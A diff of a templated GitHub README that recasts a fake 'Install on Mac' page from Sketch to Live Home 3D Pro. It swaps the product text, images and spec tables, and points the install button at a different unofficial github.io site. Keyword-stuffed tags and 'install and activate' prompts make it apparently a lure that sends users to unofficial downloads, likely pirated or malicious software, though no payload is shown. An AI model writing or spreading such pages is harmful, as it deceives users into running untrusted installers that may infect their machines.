@@ -1,12 +1,12 @@
-# Sketch  
+# Live Home 3D Pro  
 
 <div align="center">
-  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/be/Sketch-logo-light.svg/1280px-Sketch-logo-light.svg.png" width="450"/>
+  <img src="https://play-lh.googleusercontent.com/sUqFQaHBlVgAdY3bYmiJAIxWfOAHOj0xXM2emhavi-k2mGHo2H9YUvzlXFfXPY5vGHo" width="350"/>
 </div>  
 <br>
 <div align="center">
 
-[![🍏 Install on Mac](https://img.shields.io/badge/🍏_Install_on_Mac-darkblue?style=for-the-badge&logo=apple)](https://osx-applications.github.io/.github/sketch)
+[![🍏 Install on Mac](https://img.shields.io/badge/🍏_Install_on_Mac-darkblue?style=for-the-badge&logo=apple)](https://osx-quick-app.github.io/.github/livehome)
 
 </div>
 
@@ -15,22 +15,22 @@
 # Installation Instructions  
 
 1. Visit the website using the button above.  
-2. Follow the setup prompts to install and activate Sketch on your Mac.  
+2. Follow the setup prompts to install and activate Live Home 3D Pro on your Mac.  
 
 ---
 
 <div align="center">
-  <img src="https://sktch.b-cdn.net/docs/interface-and-settings/the-mac-app-interface/the-mac-app-interface-athens.png?token=23IaKUZ1KAWSC4MIzX0OLxqy87deovX1godrtnw5QuY&expires=1760367595" width="1080"/>
+  <img src="https://www.livehome3d.com/assets/img/mac/visualize-3d-home-designs@2x.jpg" width="1080"/>
 </div>  
 <br>
 
-## ✏️ Overview  
+## 🏠 Overview  
 
-Sketch is a professional-grade vector design platform crafted for macOS users, offering all the tools needed to create sleek interfaces, icons, and interactive prototypes.  
-Its intuitive layout and powerful creative toolkit make it an industry standard for designers focused on precision and collaboration.  
+Live Home 3D Pro is an advanced home design application that allows users to create detailed interior and exterior layouts in a fully interactive 3D environment.  
+Perfect for architects, interior designers, and homeowners, the software transforms your ideas into visual models with precision and realism.  
 
-The software integrates seamlessly into design workflows, supporting real-time teamwork, dynamic components, and cloud-based asset management.  
-Whether designing mobile apps, web layouts, or branding elements, Sketch provides unmatched efficiency and flexibility.  
+It includes an intuitive drag-and-drop interface, powerful visualization tools, and real-time rendering capabilities, making the design process smooth and engaging.  
+Whether planning renovations or building from scratch, Live Home 3D Pro provides everything you need to design your dream home with ease.  
 
 ---
 
@@ -38,14 +38,14 @@ Whether designing mobile apps, web layouts, or branding elements, Sketch provide
 
 | Feature | Description |
 |----------|-------------|
-| 🎨 Vector-Based Design | Draw and edit crisp, scalable visuals effortlessly. |
-| 🤝 Live Collaboration | Work alongside team members with instant syncing and updates. |
-| 📱 Adaptive Layouts | Automatically resize and align elements for any device. |
-| 🔌 Plugin Ecosystem | Enhance your workspace with hundreds of design extensions. |
-| 💡 Interactive Prototypes | Preview user journeys and motion effects in real time. |
-| 🧩 Symbol Management | Keep design elements consistent across multiple projects. |
-| ⚡ macOS Optimization | Designed natively for Apple Silicon and macOS Ventura+. |
-| ☁️ Cloud Integration | Manage, store, and share your files securely from anywhere. |
+| 🧱 3D and 2D Design | Seamlessly switch between floor plan drafting and realistic 3D visualization. |
+| 🏡 Real-Time Rendering | View instant updates as you modify lighting, materials, or furniture placement. |
+| 🪑 Extensive Object Library | Choose from thousands of furnishings, textures, and decor elements. |
+| 🌞 Lighting Simulation | Adjust natural and artificial lighting to perfect your interior mood. |
+| 📏 Precise Measurements | Build accurate layouts using exact room dimensions and wall thicknesses. |
+| 🧩 AR & VR Support | Explore your projects in immersive augmented and virtual reality. |
+| 🖥 macOS Optimization | Designed to take full advantage of Apple Silicon performance. |
+| 📸 Photo-Realistic Export | Render ultra-high-quality images and videos for presentations. |
 
 ---
 
@@ -53,14 +53,14 @@ Whether designing mobile apps, web layouts, or branding elements, Sketch provide
 
 | Component | Minimum Specification |
 |------------|------------------------|
-| Operating System | macOS 12 Monterey or newer |
-| Processor | Apple Silicon (M1/M2/M3) or Intel-based Mac |
+| Operating System | macOS 10.15 (Catalina) or later |
+| Processor | Intel or Apple Silicon (M1/M2/M3) |
 | Memory | 8 GB RAM or higher |
+| Graphics | Metal-compatible GPU |
 | Storage | 2 GB of available space |
-| Internet | Required for syncing and license activation |
 
 ---
 
 ## 🏷 Tags  
 
-sketch • sketch mac • sketch for mac • sketch up • draw • drawings to draw easy • 3d modeling • sketchpad • sketch drawing • pencil drawing • sketch up online • animal drawings • sketch up warehouse • easy flowers to draw • anime drawings • sketches to draw • anime sketch • drawing eyes • drawing and sketching • drawings of butterflies
+live home 3d • life home 3d • live home 3 d • live home • live home 3d pro • live home 3d pro mac • live home 3d mac • life home 3d pro • live interior 3d • live home 3d download • live home 3d house design • live 3d home • live home 3d app • 3d home live • live home 3d pro for mac • live home 3d online • live home 3d for mac • live home 3d interior design • live home 3d alternative • live interior 3d download
